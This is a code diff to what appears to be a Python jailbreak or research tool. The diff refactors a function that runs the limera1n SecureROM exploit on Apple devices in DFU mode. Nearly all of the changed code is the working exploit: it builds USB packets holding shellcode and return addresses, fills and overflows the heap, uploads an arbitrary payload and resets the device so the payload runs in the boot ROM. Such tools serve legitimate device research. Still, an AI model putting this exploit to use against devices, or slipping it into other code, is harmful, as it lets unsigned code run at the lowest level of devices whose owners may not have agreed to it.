@@ -5,7 +5,7 @@ from typing import Self
 import usb
 from strongarm.macho import VirtualMemoryPointer
 
-from device import Device, acquire_device, DeviceMode
+from device import Device, DeviceMode, acquire_device_with_timeout
 from os_build import DeviceModel
 from utils import TotalEnumMapping
 
@@ -42,6 +42,7 @@ class SecureRomLimera1nExploitInfo:
     def shellcode_addr(self) -> VirtualMemoryPointer:
         # Add 1 so the shellcode executes in Thumb
         return self.receive_image_buf_base + self.receive_image_buf_size - _PAGE_4KB_SIZE + 1
+
     def full_dfu_packet_with_fill(self, fill: int) -> bytearray:
         if not (0 < fill < 255):
             raise ValueError(f"Fill must fit in a byte: {fill}")
@@ -65,48 +66,49 @@ def _upload_data_to_force_timeout(device: Device, exploit_info: SecureRomLimera1
         pass
 
 
-def execute_securerom_payload(device: Device, payload: bytes) -> None:
+def execute_securerom_payload(payload: bytes) -> None:
     """Execute a payload in SecureROM using limera1n"""
-    print(f'Executing a payload of {len(payload)} bytes in SecureROM via limera1n...')
-    exploit_info = SecureRomLimera1nExploitInfo.info_for_model(device.model)
+    print('Awaiting DFU device...')
+    with acquire_device_with_timeout(DeviceMode.DFU, timeout=100) as device:
+        print(f'Got DFU device')
+        print(f'Executing a payload of {len(payload)} bytes in SecureROM via limera1n...')
+        exploit_info = SecureRomLimera1nExploitInfo.info_for_model(device.model)
 
-    dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xcc)
-    packet_cursor = 0
-    for i in range(0, len(dfu_packet_buf), 0x40):
-        packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, 0x405)
-        packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, 0x101)
-        packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, exploit_info.shellcode_addr)
-        packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, exploit_info.return_to_stack_addr)
+        dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xcc)
+        packet_cursor = 0
+        for i in range(0, len(dfu_packet_buf), 0x40):
+            packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, 0x405)
+            packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, 0x101)
+            packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, exploit_info.shellcode_addr)
+            packet_cursor = _write_u32(dfu_packet_buf, packet_cursor, exploit_info.return_to_stack_addr)
 
-    # Send the heap fill
-    # (This one includes the overflow data)
-    print('Sending heap fill')
-    device.dfu_upload_data(dfu_packet_buf)
-
-    # Fill the heap with more garbage
-    print('Filling the heap with more garbage')
-    dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xcc)
-    for i in range(0, exploit_info.receive_image_buf_size - 0x1800, exploit_info.dfu_max_packet_size):
+        # Send the heap fill
+        # (This one includes the overflow data)
+        print('Sending heap fill')
         device.dfu_upload_data(dfu_packet_buf)
 
-    print('Sending payload...')
-    device.dfu_upload_data(payload)
+        # Fill the heap with more garbage
+        print('Filling the heap with more garbage')
+        dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xcc)
+        for i in range(0, exploit_info.receive_image_buf_size - 0x1800, exploit_info.dfu_max_packet_size):
+            device.dfu_upload_data(dfu_packet_buf)
 
-    dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xbb)
-    device.handle.ctrl_transfer(0xa1, 1, 0, 0, dfu_packet_buf, 1000)
+        print('Sending payload...')
+        device.dfu_upload_data(payload)
 
-    _upload_data_to_force_timeout(device, exploit_info)
-    # This should fail too
-    try:
-        device.handle.ctrl_transfer(0x21, 2, 0, 0, dfu_packet_buf, 10)
-        raise UsbDidNotTimeout()
-    except usb.core.USBTimeoutError:
-        # Expected/desired here
-        pass
-    print(f'Sent exploit to overflow heap')
+        dfu_packet_buf = exploit_info.full_dfu_packet_with_fill(0xbb)
+        device.handle.ctrl_transfer(0xa1, 1, 0, 0, dfu_packet_buf, 1000)
 
-    # Reset the device and inform it there's a file ready to be processed
-    device.handle.reset()
-    device.dfu_notify_upload_finished()
-    with acquire_device(DeviceMode.DFU):
-        print('Device reconnected limera1n exploit successful')
+        _upload_data_to_force_timeout(device, exploit_info)
+        # This should fail too
+        try:
+            device.handle.ctrl_transfer(0x21, 2, 0, 0, dfu_packet_buf, 10)
+            raise UsbDidNotTimeout()
+        except usb.core.USBTimeoutError:
+            # Expected/desired here
+            pass
+        print(f'Sent exploit to overflow heap')
+
+        # Reset the device and inform it there's a file ready to be processed
+        device.handle.reset()
+        device.dfu_notify_upload_finished()
